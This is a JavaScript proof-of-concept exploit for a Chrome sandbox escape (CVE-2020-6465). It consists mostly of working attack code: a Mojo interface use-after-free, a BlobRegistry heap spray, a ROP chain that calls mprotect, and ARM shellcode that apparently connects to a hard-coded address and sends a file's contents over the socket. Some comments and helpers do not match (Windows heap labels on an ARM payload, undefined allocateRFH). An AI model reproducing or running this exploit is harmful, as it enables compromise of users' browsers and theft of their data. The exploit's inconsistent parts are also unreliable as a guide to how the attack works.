/*
 * Exploit Title : CVE-2020-6465 – Chrome Sandbox Bypass via Mojo and LFH Techniques
 * Target        : Chrome (and related components) vulnerable to sandbox bypass
 * Description   : This PoC demonstrates a sandbox escape mechanism using multiple techniques:
 *                 - LFH (Low Fragmentation Heap) style allocation/free via iframes.
 *                 - Leveraging Mojo interfaces and interceptors to obtain freed pointers.
 *                 - Using custom allocation and data spraying to overwrite key pointers.
 * Note          : This code is intended for educational/CTF purposes and documents
 *                 how chained steps can lead to a full sandbox bypass.
 *
 * Overall Strategy:
 * 1. Allocate and free objects (in this case, iframes) to manipulate the LFH.
 * 2. Use Mojo-based functions (e.g., creating message pipes, intercepting interface requests)
 *    to leak or obtain a pointer from freed memory.
 * 3. Construct a controlled heap spray with shellcode, gadgets, and important pointers.
 * 4. Trigger a vulnerability (via getFreedPtr and subsequent functions) to redirect execution.
 */

/* ---------------------------------------------------------------------------
 * Step 1. LFH Allocation & Free Routines for Windows (emulated)
 * These functions use iframes to simulate LFH (Low Fragmentation Heap)
 * behavior. Allocation creates an iframe with a specified src, and freeing
 * removes the iframe from the document.
 * ---------------------------------------------------------------------------
 */
function allocateLFH_Win(src) {
  var iframe = document.createElement("iframe");
  iframe.src = src; // Load a resource to force allocation on the LFH
  document.body.appendChild(iframe);
  return iframe;
}

function freeLFH_Win(iframe) {
  document.body.removeChild(iframe);
}

/* ---------------------------------------------------------------------------
 * Step 2. Mojo-based Pointer Functions
 *
 * sendPtr():
 *  - Creates a Mojo message pipe.
 *  - Binds one end to a Distiller JavaScript Service interface and the other
 *    to a custom "PWN" interface in process mode.
 *
 * getFreedPtr():
 *  - Returns a promise that resolves when a freed pointer is obtained via
 *    an interceptor on the "PWN" interface.
 *  - It allocates an iframe (using allocateRFH, assumed to be similar to allocateLFH)
 *    with a "#child" hash in the URL.
 *  - A MojoInterfaceInterceptor is set up on the "PWN" interface.
 *  - Once the interceptor’s request is captured, it stops intercepting, wraps
 *    the handle into a DistillerJavaScriptServicePtr, frees the allocated iframe,
 *    and resolves the promise with the leaked pointer.
 * ---------------------------------------------------------------------------
 */
function sendPtr() {
  var pipe = Mojo.createMessagePipe();
  // Bind one end of the pipe to the Distiller service and the other to our "PWN" interface.
  Mojo.bindInterface(domDistiller.mojom.DistillerJavaScriptService.name, pipe.handle1, "context", true);
  Mojo.bindInterface("PWN", pipe.handle0, "process");
}

function getFreedPtr() {
  // The commented-out line below implies that an allocation function may exist.
  // let allocate = getAllocationConstructor();
  return new Promise(function (resolve, reject) {
    // Allocate an iframe/resource to later free it and grab its pointer.
    var frame = allocateRFH(window.location.href + "#child");
    // Create an interceptor on the "PWN" interface in 'process' mode.
    let interceptor = new MojoInterfaceInterceptor("PWN", "process");
    interceptor.oninterfacerequest = function (e) {
      // Once our interceptor catches an interface request, stop intercepting.
      interceptor.stop();
      // Wrap the handle into a DistillerJavaScriptServicePtr for later use.
      let provider_ptr = new domDistiller.mojom.DistillerJavaScriptServicePtr(e.handle);
      // Clean up by freeing the allocated frame.
      freeRFH(frame);
      // Resolve the promise with the leaked pointer.
      resolve(provider_ptr);
    };
    interceptor.start();
  });
}

/* ---------------------------------------------------------------------------
 * Step 3. Custom Allocation Functions with Mojo Data Pipes
 *
 * getAllocationConstructor():
 *  - Binds to the BlobRegistry Mojo interface.
 *  - Defines an Allocation constructor that creates a data pipe for a given size.
 *  - Includes a ProgressClient to asynchronously signal when data is written.
 *  - Offers 'malloc', 'free', and 'read' capabilities over the allocated blob.
 *
 * This mechanism is used to spray controlled data (heap spraying) and
 * eventually overwrite function pointers or other sensitive memory areas.
 * ---------------------------------------------------------------------------
 */
function getAllocationConstructor() {
  let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
  Mojo.bindInterface(
    blink.mojom.BlobRegistry.name,
    mojo.makeRequest(blob_registry_ptr).handle,
    "process", true
  );

  function Allocation(size = 280) {
    // The ProgressClient reports the progress of data writing.
    function ProgressClient(allocate) {
      function ProgressClientImpl() {
        // No internal state needed beyond prototype definitions.
      }
      ProgressClientImpl.prototype = {
        onProgress: async (arg0) => {
          if (this.allocate.writePromise) {
            // Resolve the waiting promise with the number of bytes written.
            this.allocate.writePromise.resolve(arg0);
          }
        }
      };
      this.allocate = allocate;
      this.ptr = new mojo.AssociatedInterfacePtrInfo();
      var progress_client_req = mojo.makeRequest(this.ptr);
      this.binding = new mojo.AssociatedBinding(
        blink.mojom.ProgressClient,
        new ProgressClientImpl(),
        progress_client_req
      );
      return this;
    }

    // Create a data pipe with predetermined size.
    this.pipe = Mojo.createDataPipe({ elementNumBytes: size, capacityNumBytes: size });
    this.progressClient = new ProgressClient(this);
    // Register the data pipe with the BlobRegistry to serialize the stream.
    blob_registry_ptr.registerFromStream("", "", size, this.pipe.consumer, this.progressClient.ptr)
      .then((res) => {
        this.serialized_blob = res.blob;
      });

    // Writes data into the pipe (emulating malloc).
    this.malloc = async function (data) {
      let promise = new Promise((resolve, reject) => {
        this.writePromise = { resolve: resolve, reject: reject };
      });
      this.pipe.producer.writeData(data); // Write the desired data.
      this.pipe.producer.close();          // Close the producer to signal end-of-data.
      let written = await promise;
      console.assert(written == data.byteLength, "Written bytes mismatch!");
    };

    // Frees the allocated blob by resetting its pointer.
    this.free = async function () {
      this.serialized_blob.blob.ptr.reset();
      await sleep(1000); // Arbitrary wait to ensure cleanup.
    };

    // Reads a specified range from the allocated blob.
    this.read = function (offset, length) {
      this.readpipe = Mojo.createDataPipe({ elementNumBytes: 1, capacityNumBytes: length });
      this.serialized_blob.blob.readRange(offset, length, this.readpipe.producer, null);
      return new Promise((resolve) => {
        this.watcher = this.readpipe.consumer.watch({ readable: true }, (r) => {
          let result = new ArrayBuffer(length);
          this.readpipe.consumer.readData(result);
          this.watcher.cancel();
          resolve(result);
        });
      });
    };

    // Reads a 64-bit word at a given offset.
    this.readQword = async function (offset) {
      let res = await this.read(offset, 8);
      return (new DataView(res)).getBigUint64(0, true);
    };

    return this;
  }

  // A helper async function to allocate an object with given data.
  async function allocate(data) {
    let allocation = new Allocation(data.byteLength);
    await allocation.malloc(data);
    return allocation;
  }
  return allocate;
}

/* ---------------------------------------------------------------------------
 * Step 4. Heap Spraying and Helper Functions
 *
 * spray(data, num):
 *   - Allocates multiple chunks using the provided allocation function.
 *
 * strcpy(ab, str):
 *   - Copies a JavaScript string into an ArrayBuffer (emulating strcpy in C).
 * ---------------------------------------------------------------------------
 */
function spray(data, num) {
  return Promise.all(Array(num).fill().map(() => allocate(data)));
}

function strcpy(ab, str) {
  var view = new DataView(ab);
  for (var i = 0; i < str.length; i++) {
    view.setUint8(i, str.charCodeAt(i));
  }
}

/* ---------------------------------------------------------------------------
 * Step 5. Main Trigger Function
 *
 * The trigger function orchestrates the exploit chain:
 *  - If the window's location hash equals "#child", it calls sendPtr() to send a
 *    pointer via Mojo (used in a chained callback).
 *  - Otherwise, it begins the allocation/construction of a large ArrayBuffer and
 *    prepares for heap spraying.
 *  - It sets up a controlled memory layout that includes gadget addresses,
 *    shellcode, and other data required to hijack execution flow.
 *  - Finally, it leverages a previously freed pointer (via getFreedPtr) to
 *    overwrite critical data or function pointers.
 * ---------------------------------------------------------------------------
 */
async function trigger(oob) {
  // If we're in the child process/iframe, simply send a pointer.
  if (window.location.hash == "#child") {
    print("send");
    sendPtr();
    return;
  }
  print("trigger");

  // Obtain the allocation constructor to spray our payload.
  let allocate = getAllocationConstructor();

  // Bind a PeerConnectionTrackerHost interface to interact with Chrome internals.
  let ptr2 = new blink.mojom.PeerConnectionTrackerHostPtr();
  Mojo.bindInterface(blink.mojom.PeerConnectionTrackerHost.name, mojo.makeRequest(ptr2).handle, "process");

  // Allocate a large ArrayBuffer to construct the payload.
  let size = 0x30000;
  let ab = new ArrayBuffer(size);
  let view = new DataView(ab);

  /* 
   * A memory dump example (from gdb) is provided here for context to illustrate
   * the structure of the heap. This helps visualize how gadgets and pointers are
   * arranged in memory.
   *
   * (gdb) x/30wx 0xcaf0c000
   * 0xcaf0c000: 0xbe006000 0xd0353488 0xd0353490 0xd0352afc
   * 0xcaf0c010: ... [truncated for brevity]
   */

  // Define a base heap address (example value); print it for debugging.
  let heap = 0xbcf8c000;
  print(heap.toString(16));

  // 'base' represents a key address, provided via the out-of-bounds (oob) object.
  var base = oob.chrome_child_base; // e.g., 0xbc403380

  // Read a pointer from a calculated offset; use it to compute the libc base.
  let read_ptr = oob.getUint32_2(base + 0x0309C074);
  var libc = read_ptr - 0x1d5ad; // Adjust to get libc base; this offset is from the vulnerability analysis.

  // Compute the address of mprotect in libc which will be used for ROP.
  let mprotect = libc + 0x4abdc;

  // Define a series of ROP gadgets, calculated as offsets from 'base'.
  let gadget1 = base + 0x6782a8; // e.g., "mov sp, r0; add sp, sp, #4; pop {...}; bx lr"
  let gadget2 = base + 0x6782b0; // e.g., "pop {r4, r5, ...}; bx lr"
  let gadget3 = base + 0x67791c; // "pop {r4, pc}"
  let gadget4 = base + 0x7bf918; // "pop {r4, r5, pc}"
  let gadget5 = base + 0x8cf14c; // "pop {r0, pc}"
  let gadget6 = base + 0x7d72bc; // "pop {r1, pc}"
  let gadget7 = base + 0x9468ec; // "pop {r2, pc}"
  let gadget8 = base + 0x691754; // "bx r4" (branch via r4)
  let gadget9 = base + 0xce08c8; // "pop {lr, pc}"

  // Begin crafting the fake control structure in our ArrayBuffer.
  var cnt = 0;
  for (var i = 0; i < 0x4000;) {
    // Determine which segment to build based on the current offset.
    var idx = parseInt(i / 0x1000) % 0x4;
    switch (idx) {
      case 0:
        // Fill with a pointer and a chain of gadgets.
        view.setUint32(i, heap + 0x2000, true);
        view.setUint32(i + 4, gadget1, true);
        view.setUint32(i + 8, gadget2, true);
        view.setUint32(i + 12, gadget3, true);
        i += 16;
        break;
      case 1: // Insert a gadget chain payload.
        var pay = [];
        pay.push(gadget5);
        pay.push(heap + 0x3000);
        pay.push(gadget6);
        pay.push(0x1000);
        pay.push(gadget7);
        pay.push(7);
        pay.push(gadget9);
        pay.push(heap + 0x3000);
        pay.push(mprotect);
        pay.push(0x41414141); // Filler pattern

        // Write the payload near the end of the current 0x1000 block.
        for (var j = 0; j < pay.length; j++) {
          view.setUint32((i + 0x1000 - pay.length * 4) + (j * 4), pay[j], true);
        }

        // Fill the rest of the block with repetitive gadget sequences.
        for (var j = 0; j < (0x1000 - pay.length * 4); j += 8) {
          view.setUint32(i + j, gadget3, true);
          view.setUint32(i + j + 4, gadget4, true);
        }
        i += 0x1000;
        break;
      case 2:
        // Insert a standalone gadget that may serve as an initial program counter.
        view.setUint32(i, gadget1, true);
        i += 4;
        break;
      case 3: // Write the shellcode segment.
        var sc = [
          0xe1a0800f, 0xe28880ff, 0xe28880ff, 0xe28880ff, 0xe28880ff,
          0xe3a00002, 0xe3a01001, 0xe0222002, 0xe3007119, 0xef000000,
          0xe1a06000, 0xe30f7e81, 0xe3427bf6, 0xe52d7004, 0xe3007002,
          0xe3457c11, 0xe52d7004, 0xe1a00006, 0xe1a0100d, 0xe3a02010,
          0xe300711b, 0xef000000, 0xe3047100, 0xe3447141, 0xe52d7004,
          0xe306796b, 0xe3477365, 0xe52d7004, 0xe304732f, 0xe3467f6f,
          0xe52d7004, 0xe3077561, 0xe347746c, 0xe52d7004, 0xe304742f,
          0xe3467665, 0xe52d7004, 0xe3067f72, 0xe346756d, 0xe52d7004,
          0xe3057f70, 0xe3467863, 0xe52d7004, 0xe3027f65, 0xe3477061,
          0xe52d7004, 0xe3077268, 0xe3467d6f, 0xe52d7004, 0xe3067469,
          0xe346732e, 0xe52d7004, 0xe306746e, 0xe3467f72, 0xe52d7004,
          0xe3067d6f, 0xe346712e, 0xe52d7004, 0xe3067174, 0xe346732f,
          0xe52d7004, 0xe3027f61, 0xe3467164, 0xe52d7004, 0xe306742f,
          0xe3477461, 0xe52d7004, 0xe1a0000d, 0xe0211001, 0xe0222002,
          0xe3a07005, 0xef000000, 0xe1a01008, 0xe3a02801, 0xe3a07003,
          0xef000000, 0xe1a00006, 0xe1a01008, 0xe3a02801, 0xe3a07004,
          0xef000000
        ];
        // Write the shellcode at the end of the block.
        for (var j = 0; j < sc.length; j++) {
          view.setUint32((i + 0x1000 - sc.length * 4) + (j * 4), sc[j], true);
        }
        // Fill any remaining bytes in the block with NOPs.
        for (var j = 0; j < (0x1000 - sc.length * 4); j += 4) {
          view.setUint32(i + j, 0xe320f000, true); // NOP instruction
        }
        i += 0x1000;
        break;
    }
    cnt += 1;
  }

  // Duplicate the crafted block across the complete ArrayBuffer.
  var view2 = new Uint8Array(ab);
  for (var i = 1; i < (size / 0x4000); i++) {
    view2.set(new Uint8Array(ab).slice(0, 0x4000), 0x4000 * i);
    print(i);
  }

  // Spray the heap by allocating multiple copies of our ArrayBuffer.
  var size2 = 0x100;
  print(size2);
  let chunks = new Array(size2);
  for (var i = 0; i < size2; i++) {
    chunks[i] = await allocate(ab);
  }
  print("done");

  // Prepare the target pointer by splitting the heap address into 4 bytes (little-endian).
  var target = [];
  target.push(heap % 0x100);
  target.push((heap / 0x100) % 0x100);
  target.push((heap / 0x10000) % 0x100);
  target.push((heap / 0x1000000) % 0x100);

  // Retrieve a pointer to a freed object, which we aim to hijack.
  let ptr = await getFreedPtr();

  // Overwrite memory by constructing an array of target bytes repeated over the required length.
  var arr = [];
  for (var i = 0; i < (0x828 / 4); i++) {
    arr = arr.concat(target);
  }
  // Use an interface method (webRtcEventLogWrite) to write our payload and trigger code execution.
  ptr2.webRtcEventLogWrite(1, arr);
  // Finally, call a function via the interrupted interface to switch control.
  ptr.handleDistillerOpenSettingsCall();
}